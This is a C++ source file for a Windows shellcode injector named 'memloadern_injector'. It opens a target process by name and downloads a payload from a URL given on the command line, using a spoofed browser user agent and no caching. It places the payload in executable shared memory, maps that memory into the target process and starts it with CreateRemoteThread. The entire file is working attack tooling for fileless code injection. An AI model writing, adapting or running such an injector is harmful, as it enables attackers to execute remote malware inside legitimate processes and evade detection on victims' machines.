#include <iostream>

// Windows API
#include <windows.h>
#include <wininet.h>

#include "proc.h"

#pragma comment (lib, "OneCore.lib")
#pragma comment (lib, "wininet.lib")

int wmain(int argc, wchar_t* argv[]) {
	if (argc != 3) {
		std::cout << "Usage: ./memloadern_injector [process name] [url]" << std::endl;
		return -1;
	}
	
	//Open Process for injection
	int procId = GetPidByName(argv[1]);
	if (procId == 0) {
		std::wcout << "\nERROR :: Could not find process: " << argv[1] << std::endl;
		return -1;
	}

	std::wcout << "\nOpening Process: " << argv[1] << " with PID " << procId << " for injection" << std::endl;

	HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE,
		(DWORD)procId);
	if (hProc == NULL)
	{
		std::cout << "Failed to open process with ID: " << procId << std::endl;
		return -1;
	}

	// Download file using wininet
	std::cout << "Downloading File..." << '\n';
	HINTERNET hInternet, hFile;

	const wchar_t* userAgent = L"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0";
	const wchar_t* url = argv[2];

	hInternet = InternetOpen(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	// Do not save cache
	hFile = InternetOpenUrl(hInternet, url, 0, 0,
		INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE |
		INTERNET_FLAG_RELOAD, 0);
	
	// Memory Mapped file
	HANDLE hMapping;
	SIZE_T size = 512;

	hMapping = CreateFileMapping(
		INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, size, L"MEMORY");
	if (hMapping == NULL)
	{
		std::cout << "failed to create file map: " << std::endl;
		return -1;
	}
	
	LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, NULL, NULL, NULL);
	char* startAddr = static_cast<char*> (lpMapAddress);

	DWORD NumOfBytesRead = 0;
	DWORD tmp;
	char buf[512];

	while (InternetReadFile(hFile, buf, size, &NumOfBytesRead) && NumOfBytesRead)
	{
		CopyMemory(startAddr, buf, size);
	}
	
	HANDLE hMapFile;
	hMapFile = OpenFileMapping(FILE_MAP_ALL_ACCESS, TRUE, L"MEMORY");

	LPVOID lpMapAddressRemote = MapViewOfFile2(hMapFile, hProc, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
	HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);
	if (hRemoteThread == NULL)
	{
		std::cout << "Injection Failed! :(" << std::endl;
		return -1;
	}


	std::cout << "Injected into process!" << std::endl;

	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);
	UnmapViewOfFile(lpMapAddress);
	UnmapViewOfFile(lpMapAddressRemote);

	CloseHandle(hMapFile);
	CloseHandle(hMapping);
}